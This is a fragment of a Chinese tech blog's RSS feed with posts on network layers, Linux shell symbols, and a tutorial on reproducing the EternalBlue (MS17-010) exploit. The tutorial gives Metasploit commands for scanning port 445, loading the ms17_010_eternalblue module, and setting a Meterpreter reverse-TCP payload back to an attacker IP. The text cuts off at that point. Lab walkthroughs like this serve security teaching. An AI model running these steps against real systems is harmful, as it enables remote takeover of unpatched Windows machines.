• 请求内容：&amp;ldquo;请给我首页HTML文件&amp;rdquo;（写在快递单上的文字）&lt;/p>
&lt;h4 id="2-运输层拆包贴标签">&lt;strong>2. 运输层（拆包+贴标签）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>TCP协议处理&lt;/strong>
• 源端口：随机生成（比如&lt;code>54321&lt;/code>，你的浏览器门牌号）
• 目的端口：&lt;code>80&lt;/code>（默认HTTP服务的门牌号）
• 动作：把&amp;quot;首页请求&amp;quot;拆成多个小包裹，每个包裹标注顺序号（类似快递箱编号1/3、2/3、3/3）&lt;/p>
&lt;h4 id="3-网络层找路">&lt;strong>3. 网络层（找路）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>路由器N1（你的网关）&lt;/strong>
• 源IP：&lt;code>10.0.0.2&lt;/code>
• 目的IP：&lt;code>10.20.1.100&lt;/code>
• 查路由表：&amp;ldquo;去往&lt;code>10.20.0.0/16&lt;/code>网段，下一跳是路由器N2（IP &lt;code>10.0.0.1&lt;/code>）&amp;rdquo;
• 类似快递分拣员：&amp;ldquo;这个包裹是10.20网段的，走3号通道到N2！&amp;rdquo;&lt;/p>
&lt;h4 id="4-数据链路层卡车运输">&lt;strong>4. 数据链路层（卡车运输）&lt;/strong>
&lt;/h4>&lt;p>• &lt;strong>从电脑到路由器N1&lt;/strong>
• 源MAC地址：&lt;code>AA:BB:CC:DD:EE:01&lt;/code>（你的电脑网卡）
• 目的MAC地址：&lt;code>AA:BB:CC:DD:EE:02&lt;/code>（路由器N1的接口）
• 动作：通过网线/WiFi传输（卡车运输）&lt;/p>
&lt;h4 id="5-物理层信号传输">&lt;strong>5. 物理层（信号传输）&lt;/strong>
&lt;/h4>&lt;p>• 网线中的电信号或WiFi的无线电波，把二进制数据流（&lt;code>01101000...&lt;/code>）从电脑传到路由器N1。&lt;/p>
&lt;hr>
&lt;h3 id="-完整路径含ip">🌐 &lt;strong>完整路径（含IP）&lt;/strong>
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">你的电脑 (10.0.0.2) → 路由器N1 → 路由器N2 → 公司服务器 (10.20.1.100)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>&lt;strong>应用层&lt;/strong>：浏览器发起请求 → 服务器返回网页&lt;/li>
&lt;li>&lt;strong>运输层&lt;/strong>：TCP通过端口（源端口）&lt;code>54321→80&lt;/code>（目标端口）保证数据顺序&lt;/li>
&lt;li>&lt;strong>网络层&lt;/strong>：IP地址（源IP）&lt;code>10.0.0.2→10.20.1.100&lt;/code>（目标IP）指引方向&lt;/li>
&lt;li>&lt;strong>数据链路层&lt;/strong>：MAC地址逐段接力传输（每经过一个路由器，源/目的MAC都会改变）&lt;/li>
&lt;li>&lt;strong>物理层&lt;/strong>：网线/WiFi承载光/电信号&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="-关键点">💡 &lt;strong>关键点&lt;/strong>
&lt;/h3>&lt;ol>
&lt;li>&lt;strong>IP地址的作用&lt;/strong>：
• 类似快递收件地址，网络层靠IP地址决定包裹往哪送
• &lt;code>10.x.x.x&lt;/code>是私有IP（类似公司内部房间号），仅在局域网内使用&lt;/li>
&lt;li>&lt;strong>MAC地址的作用&lt;/strong>：
• 类似卡车车牌号，数据链路层靠MAC地址完成&amp;quot;最后一公里&amp;quot;配送
• 每经过一个路由器（N1→N2），MAC地址都会更新，但IP地址始终不变&lt;/li>
&lt;li>&lt;strong>为什么用10网段？&lt;/strong>
• 私有IP地址（10.0.0.0~10.255.255.255）专用于内网
• 避免和公网IP冲突，适合企业/家庭内部通信&lt;/li>
&lt;/ol></description></item><item><title>Linux中特殊符号含义</title><link>https://souljian.cn/p/745241842/</link><pubDate>Mon, 21 Apr 2025 21:24:02 +0800</pubDate><guid>https://souljian.cn/p/745241842/</guid><description>&lt;h1 id="">
&lt;/h1>&lt;h2 id="一特殊字符说明">一、特殊字符说明
&lt;/h2>&lt;h3 id="一注释字符">（一）&lt;code>#&lt;/code>：注释字符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：以 &lt;code>#&lt;/code> 开头的内容被视为注释，不会被执行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This line is a comment.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">this_string&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;amazing alvin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> awesome &lt;span class="si">${&lt;/span>&lt;span class="nv">this_string&lt;/span>&lt;span class="p">#amazing&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="c1"># 输出去掉 &amp;#34;amazing&amp;#34; 的字符串&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$this_string&lt;/span> &lt;span class="c1"># 输出原始字符串&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：用于在脚本中添加说明或临时禁用某些命令。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二代表用户的-home-目录">（二）&lt;code>~&lt;/code>：代表用户的 home 目录
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：&lt;code>~&lt;/code> 表示当前用户的家目录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~ &lt;span class="c1"># 返回当前用户的家目录&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> ~/Documents &lt;span class="c1"># 进入家目录下的 Documents 文件夹&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：快速定位到用户的家目录或其子目录。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="三分号连续指令">（三）&lt;code>;&lt;/code>：分号（连续指令）
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：分隔多个命令，即使前面的命令失败，后面的命令也会继续执行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls &amp;gt; count.txt&lt;span class="p">;&lt;/span> wc -l count.txt&lt;span class="p">;&lt;/span> rm count.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：在一行中执行多个命令。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="四路径分隔符">（四）&lt;code>/&lt;/code>：路径分隔符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：用于分隔路径中的目录和文件名，&lt;code>/&lt;/code> 也表示根目录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /usr/local/bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：表示路径或切换到根目录。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="五转义符">（五）&lt;code>\&lt;/code>：转义符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>取消特殊字符的功能。&lt;/li>
&lt;li>连接多行命令。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="se">\r&lt;/span>m file.txt &lt;span class="c1"># 取消 rm 的别名&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Backup dir, \$bkdir = &lt;/span>&lt;span class="nv">$bkdir&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="c1"># 输出 $bkdir 而非变量内容&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：用于转义特殊字符或分割长命令。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="六管道符">（六）&lt;code>|&lt;/code>：管道符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：将一个命令的输出作为下一个命令的输入。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">who &lt;span class="p">|&lt;/span> wc -l &lt;span class="c1"># 统计当前登录用户数量&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：连接多个命令，实现复杂的数据处理。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="七当前目录">（七）&lt;code>.&lt;/code>：当前目录
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：表示当前目录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./script.sh &lt;span class="c1"># 执行当前目录下的 script.sh 脚本&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：指定当前目录下的文件或脚本。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="八父目录">（八）&lt;code>..&lt;/code>：父目录
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：表示当前目录的上一级目录。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> .. &lt;span class="c1"># 返回上一级目录&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：快速切换到父目录。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="九单字符通配符">（九）&lt;code>?&lt;/code>：单字符通配符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：匹配文件名中的任意单个字符。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f?.txt &lt;span class="c1"># 匹配 f0.txt、f1.txt 等&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：用于文件名匹配。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="十多字符通配符">（十）&lt;code>*&lt;/code>：多字符通配符
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：匹配任意长度的字符序列。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f*.txt &lt;span class="c1"># 匹配以 f 开头的所有 .txt 文件&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：用于文件名匹配。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="十一逻辑非">（十一）&lt;code>!&lt;/code>：逻辑非
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>功能&lt;/strong>：表示逻辑非，用于条件表达式中。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f&lt;span class="o">[&lt;/span>!1-9&lt;span class="o">]&lt;/span>.txt &lt;span class="c1"># 匹配除了 f1.txt 到 f9.txt 之外的文件&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>用途&lt;/strong>：用于条件判断或文件名匹配。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="二补充特殊字符">二、补充特殊字符
&lt;/h2>&lt;h3 id="十二">（十二）`
&lt;/h3></description></item><item><title>永恒之蓝漏洞复现</title><link>https://souljian.cn/p/745241647/</link><pubDate>Mon, 21 Apr 2025 21:20:47 +0800</pubDate><guid>https://souljian.cn/p/745241647/</guid><description>&lt;hr>
&lt;h3 id="一什么是永恒之蓝">（一）什么是永恒之蓝？
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>定义&lt;/strong>：永恒之蓝（Eternal Blue）是一种利用 Windows 系统 SMB 协议漏洞（通常使用 139、445 端口）的攻击方式，攻击者通过该漏洞可获取系统最高权限，进而控制被入侵计算机。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>影响范围&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>2017 年 5 月 12 日，不法分子改造&amp;quot;永恒之蓝&amp;quot;制作了 WannaCry 勒索病毒，导致全球范围内大量机构（包括学校、大型企业和政府机构）遭受攻击。&lt;/li>
&lt;li>被攻击设备被锁定，要求支付 300 美元比特币赎金，否则删除文件。&lt;/li>
&lt;li>攻击通过扫描开放 445 端口的 Windows 机器，无需用户操作，开机上网即可被植入勒索软件、远程控制木马等恶意程序。&lt;/li>
&lt;li>受影响国家包括乌克兰、俄罗斯、西班牙、法国、英国等，重要基础设施（政府、银行、电力系统等）均被波及。
&lt;img src="https://souljian.cn/p/745241647/img/2025-04-22-13-38-59.png"
width="885"
height="469"
srcset="https://souljian.cn/p/745241647/img/2025-04-22-13-38-59_hu_372e737200bd2b29.png 480w, https://souljian.cn/p/745241647/img/2025-04-22-13-38-59_hu_d6405b833161b6f0.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="188"
data-flex-basis="452px"
>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="二受影响的系统版本">（二）受影响的系统版本
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>桌面操作系统&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>Windows XP&lt;/li>
&lt;li>Windows Vista&lt;/li>
&lt;li>Windows 7&lt;/li>
&lt;li>Windows 8&lt;/li>
&lt;li>Windows 8.1&lt;/li>
&lt;li>Windows 10&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>服务器操作系统&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>Windows Server 2000&lt;/li>
&lt;li>Windows Server 2003&lt;/li>
&lt;li>Windows Server 2008&lt;/li>
&lt;li>Windows Server 2012&lt;/li>
&lt;li>Windows Server 2016&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>备注&lt;/strong>：是否受影响取决于是否安装了对应的补丁。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="二永恒之蓝攻击步骤">二、永恒之蓝攻击步骤
&lt;/h2>&lt;h3 id="一内网扫描存活机器">（一）内网扫描存活机器
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS -p &lt;span class="m">445&lt;/span> 192.168.110.0/24 &amp;gt; p_445
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>使用 &lt;code>nmap&lt;/code> 工具进行半开放扫描（&lt;code>-sS&lt;/code>），扫描指定网段（&lt;code>192.168.110.0/24&lt;/code>）内开放 445 端口的主机。&lt;/li>
&lt;li>扫描结果保存到文件 &lt;code>p_445&lt;/code> 中。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>目的&lt;/strong>：找出内网中可能存在的目标主机。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="二确定攻击目标">（二）确定攻击目标
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>操作&lt;/strong>：筛选出开放 445 端口的存活机器，确定攻击目标。&lt;/li>
&lt;/ul>
&lt;h3 id="三测试目标连通性">（三）测试目标连通性
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ping &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：通过 &lt;code>ping&lt;/code> 命令测试目标主机的网络连通性，确保目标主机可达。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="四打开-kali-数据库">（四）打开 Kali 数据库
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">service postgresql status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql status
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>查看 PostgreSQL 数据库服务的状态。&lt;/li>
&lt;li>如果未开启，则启动数据库服务。&lt;/li>
&lt;li>再次确认数据库服务已成功启动。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="五数据库初始化">（五）数据库初始化
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfdb init
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：初始化 Metasploit 框架的数据库，为后续攻击做准备。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="六启动-msf-工具">（六）启动 msf 工具
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：启动 Metasploit 框架的控制台。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="七搜索永恒之蓝漏洞">（七）搜索永恒之蓝漏洞
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search ms17_010
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：在 Metasploit 框架中搜索与 MS17-010 漏洞相关的模块。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="八选择扫描模块">（八）选择扫描模块
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/smb/smb_ms17_010
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/windows/smb/ms17_010_eternalblue
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>auxiliary/scanner/smb/smb_ms17_010&lt;/code>：用于扫描目标主机是否存在 MS17-010 漏洞（Proof of Concept，PoC 扫描）。&lt;/li>
&lt;li>&lt;code>exploit/windows/smb/ms17_010_eternalblue&lt;/code>：用于实际利用 MS17-010 漏洞的攻击模块。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="九设置扫描基本配置">（九）设置扫描基本配置
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> rhost &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/reverse_tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lhost &lt;span class="o">[&lt;/span>攻击机IP&lt;span class="o">]&lt;/span>
